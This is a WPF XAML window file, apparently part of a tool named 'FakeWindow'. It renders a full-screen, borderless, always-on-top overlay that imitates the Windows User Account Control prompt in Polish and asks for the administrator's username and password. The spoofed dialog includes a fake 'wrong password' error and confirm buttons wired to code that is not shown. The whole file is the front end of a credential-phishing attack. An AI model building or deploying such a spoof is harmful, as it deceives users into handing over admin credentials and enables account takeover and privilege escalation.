<Window x:Class="FakeWindow.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:FakeWindow"
        mc:Ignorable="d"
        AllowsTransparency="True"
        WindowStyle="None"   
        Title="Chrome"
        Background="Transparent"
		Topmost="True"
        Height="1080"
        Width="1920"
    >
	<Grid>
		<Rectangle Fill="Black" Opacity="0.5" />
		<Border BorderThickness="1" BorderBrush="#0078D7" Width="456" MinHeight="540" HorizontalAlignment="Center" VerticalAlignment="Center">
			<StackPanel Orientation="Vertical" Background="#E6E6E6">
				<StackPanel Orientation="Vertical" Background="#76B9ED">
					<Grid Margin="24,8,10,0">
						<Grid.ColumnDefinitions>
							<ColumnDefinition Width="*" />
							<ColumnDefinition Width="Auto" />
						</Grid.ColumnDefinitions>
						<TextBlock Text="Kontrola konta użytkownika" Foreground="Black" FontSize="12" Grid.Column="0" VerticalAlignment="Center" />
						<TextBlock Text="❌" Foreground="Black" Cursor="Hand" FontSize="7" VerticalAlignment="Center" Grid.Column="1" MouseDown="Close_Btn" />
					</Grid>
					<TextBlock Text="Czy chcesz zezwolić tej aplikacji na wprowadzenie zmian na tym urządzeniu?" Margin="24,9,24,12" FontSize="20" Foreground="Black" TextWrapping="Wrap" />
				</StackPanel>
				<StackPanel Orientation="Vertical" Margin="24,22">
					<StackPanel Orientation="Horizontal" Margin="0,5,0,15">
						<Image x:Name="icon" Height="39" Width="39" />
						<TextBlock Text="XXXXX" Foreground="Black" FontSize="19" VerticalAlignment="Center" Margin="10,0,0,0" x:Name="name" />
					</StackPanel>

					<TextBlock Text="Zweryfikowany wydawca: XXXXX" Foreground="Black" FontSize="14" x:Name="publisher" />
					<TextBlock Text="Pochodzenie pliku: Dysk twardy w tym komputerze" Foreground="Black" FontSize="14" />
					<TextBlock Text="Lokalizacja programu: XXXX" Visibility="Collapsed" Foreground="Black" FontSize="14" x:Name="location" TextWrapping="Wrap" />

					<TextBlock Text="Pokaż więcej szczegółów" Foreground="#2C8DDA" FontSize="14" Margin="0,19,0,8" x:Name="properties" MouseDown="ShowMore" Cursor="Hand" />

					<TextBlock Text="Aby kontynuować wpisz nazwę użytkownika i hasło administratora." Foreground="Black" FontSize="14" TextWrapping="Wrap" />

					<TextBlock x:Name="admin_user" Text="&lt;Admin user&gt;" Foreground="Black" FontSize="14" Margin="0,21,0,13" />




					<PasswordBox x:Name="password" Foreground="Black" Height="32" BorderThickness="1" BorderBrush="#8A8A8A" 
						Background="#F0F0F0"
						VerticalAlignment="Center"
						FontSize="13"
						Padding="5"
					
						
					/>




					<TextBlock x:Name="admin_user_path" Text="&lt;DESKTOP-XXXX\Admin_user&gt;" Foreground="Black" FontSize="14" Margin="0,12,0,27" />

					<TextBlock x:Name="error" Text="Nazwa użytkownika lub hasło są nieprawidłowe." Foreground="#C50500" FontSize="14" Margin="0,-3,0,15" Visibility="Collapsed" />

					<TextBlock Text="Więcej opcji" Foreground="#2C8DDA" FontSize="14" Margin="0,3,0,0" Cursor="Hand" />

					<StackPanel Orientation="Horizontal" Margin="0,21,0,0">
						<Button Click="Confirm_Btn" Content="Tak" Background="#B8B8B8" Foreground="Black" Width="201" Height="32" BorderThickness="0" Margin="0,0,2,0" Cursor="Hand" >
							<Button.Template>
								<ControlTemplate TargetType="Button">
									<Border Background="{TemplateBinding Background}" x:Name="border">
										<ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
									</Border>
									<ControlTemplate.Triggers>
										<Trigger Property="IsMouseOver" Value="True">
											<Setter TargetName="border" Property="Background" Value="#a8a8a8"/>
										</Trigger>
									</ControlTemplate.Triggers>
								</ControlTemplate>
							</Button.Template>
						</Button>
						<Button Content="Nie" Background="#B8B8B8" Foreground="Black" Width="201" Height="32" BorderThickness="0" Margin="2,0,0,0" Cursor="Hand" Click="Cancel_Btn">
							<Button.Template>
								<ControlTemplate TargetType="Button">
									<Border Background="{TemplateBinding Background}" x:Name="border">
										<ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
									</Border>
									<ControlTemplate.Triggers>
										<Trigger Property="IsMouseOver" Value="True">
											<Setter TargetName="border" Property="Background" Value="#a8a8a8"/>
										</Trigger>
									</ControlTemplate.Triggers>
								</ControlTemplate>
							</Button.Template>
						</Button>
					</StackPanel>

				</StackPanel>
			</StackPanel>
		</Border>
	</Grid>
</Window>
